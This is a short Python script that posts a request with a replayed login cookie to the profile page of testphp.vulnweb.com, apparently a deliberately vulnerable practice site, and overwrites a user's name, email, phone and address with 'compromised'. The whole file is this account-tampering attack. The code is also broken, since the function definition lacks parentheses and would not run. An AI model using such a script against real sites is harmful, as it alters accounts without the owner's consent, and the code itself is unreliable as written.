import requests


def comprimise_data:
    url = "http://testphp.vulnweb.com/userinfo.php"

    payload = "urname=bau&ucc=compromised&uemail=compromised%40yahoo.fr&uphone=compromised&uaddress=CompromisedLandUSA&update=update"
    headers = {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'http://testphp.vulnweb.com',
      'Connection': 'keep-alive',
      'Referer': 'http://testphp.vulnweb.com/userinfo.php',
      'Cookie': 'login=test%2Ftest',
      'Upgrade-Insecure-Requests': '1'
    }

    response = requests.request("POST", url, headers=headers, data=payload)
